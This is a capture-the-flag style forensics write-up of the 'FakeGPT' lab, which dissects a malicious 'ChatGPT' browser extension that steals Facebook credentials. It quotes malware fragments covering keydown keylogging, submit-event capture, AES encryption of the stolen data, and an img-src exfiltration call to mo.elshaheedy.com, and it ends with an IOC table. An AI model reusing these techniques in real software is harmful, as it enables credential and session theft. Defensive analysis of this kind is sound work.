## Challenge Information
- **Name:** FakeGPT Lab
- **Author:** Mo.Elshaheedy, CyberDefenders
- **Category:** Network Forensics
- **Difficulty:** Easy

---

## Scenario Overview
A browser extension named “ChatGPT” was reported to cause suspicious browser behavior after installation. Multiple users experienced account compromises and data leakage. The objective of this investigation is to analyze the extension’s source code and identify its malicious behaviors, including targeting logic, data exfiltration mechanisms, and encryption methods.

---

## Objectives

1. Identify the encoding method used to obscure target URLs
2. Determine the website being monitored for credential theft
3. Identify the HTML element used to send stolen data
4. Identify the first condition that causes the extension to deactivate itself
5. Determine which event is captured to track form-based user input
6. Identify the API or method used to capture user keystrokes
7. Determine the domain used to exfiltrate stolen data
8. Identify the function responsible for exfiltrating user credentials
9. Determine the encryption algorithm applied before data transmission
10. Identify what the extension accesses to store or manipulate session-related data

---

## Tools Used
- Visual Studio Code
- Kali Linux

---

## Investigation & Analysis Steps

### Encoding Method Used to Obscure Target URLs
- The investigation began by opening `manifest.json`, which revealed that `core/app.js` is injected into every visited webpage. This indicates that all targeting logic is implemented in `app.js`.
- Within `app.js`, conditional checks using `window.location.hostname` and `indexOf()` were observed. One of these comparisons involved a suspicious string ending in `==`, a strong indicator of Base64 encoding.
- Decoding the string using Kali Linux confirmed that **Base64 encoding** is used to obscure target URLs.
> Common patterns to check: `window.location`, `document.location`, `hostname`, `href`, `origin`, `includes()`, `indexOf()`, `if(...)`

### Website Being Monitored for Credential Theft
- The Base64-encoded string extracted from app.js was decoded using: `echo <base64-string> | base64 -d`\
- The decoded value revealed the monitored domain: `www.facebook.com`
- This confirms that the extension specifically targets Facebook users to steal credentials.

### HTML Element Used to Send Stolen Data
- Further inspection of `app.js` revealed a function responsible for sending data to a remote server. Inside this function, the following line was identified: `var image = new Image();`
- This indicates that the extension uses a dynamically created **HTML <img> element** to transmit stolen data by embedding it within the image source URL.

### Extension Deactivation Condition
- The extension contains logic to determine whether it is running in a controlled or virtualized environment. This check is performed early during execution.
- If the condition fails (e.g., the browser is detected to be running in an analysis or sandbox environment), the extension **deactivates itself** and does not execute its malicious functionality. This behavior is consistent with sandbox evasion techniques.

### Event Captured to Track Form Submissions
- To capture user credentials entered into login forms, the extension listens for the _submit event_: `document.addEventListener('submit', function(event) { ... });`
- This allows the extension to intercept usernames, email addresses, and passwords when a user submits a form.

### API / Method Used to Capture User Keystrokes
- In addition to form submissions, the extension monitors individual keystrokes by attaching a listener to the `keydown` event:
`document.addEventListener('keydown', function(event) {
    var key = event.key;
});`
- Each keystroke is captured using the `event.key` property, enabling real-time keylogging.

### Domain Used for Data Exfiltration
- The function responsible for data transmission assigns a remote URL to the image source: `img.src = "https://mo.elshaheedy.com/collect?data=";`
- From this, the domain used to receive stolen data is identified as: `mo.elshaheedy.com`

### Function Used to Exfiltrate User Credentials
- The credential theft logic is clearly implemented in a dedicated function within app.js: `exfiltrateCredentials(username, password);`
- This function collects authentication data and passes it through the encryption and exfiltration workflow.

### Encryption Algorithm Applied Before Transmission
- Before data is sent to the remote server, it is encrypted using the CryptoJS library. The following line was identified: `Crypto.AES.encrypt(payload, key);`
- This confirms that the **AES (Advanced Encryption Standard)** algorithm is used to encrypt stolen data prior to exfiltration.

### Session and Authentication Data Access
- Reviewing the permissions requested in `manifest.json` revealed that the extension requests access to **browser cookies**.
- Cookies are commonly used to store session identifiers and authentication tokens, indicating that the extension can access or manipulate session-related data in addition to stealing credentials.

---

## Findings / Indicators of Compromise (IOCs)

| Type                       | Indicator                                   |
| -------------------------- | ------------------------------------------- |
| Targeted Website           | [www.facebook.com](http://www.facebook.com) |
| Encoding Method            | Base64                                      |
| HTML Exfiltration Element  | `<img>`                                     |
| Keystroke Capture Event    | keydown                                     |
| Form Capture Event         | submit                                      |
| Encryption Algorithm       | AES                                         |
| Exfiltration Domain        | mo.elshaheedy.com                           |
| Credential Theft Function  | exfiltrateCredentials()                     |
| Session Data Access Method | Browser cookies                             |
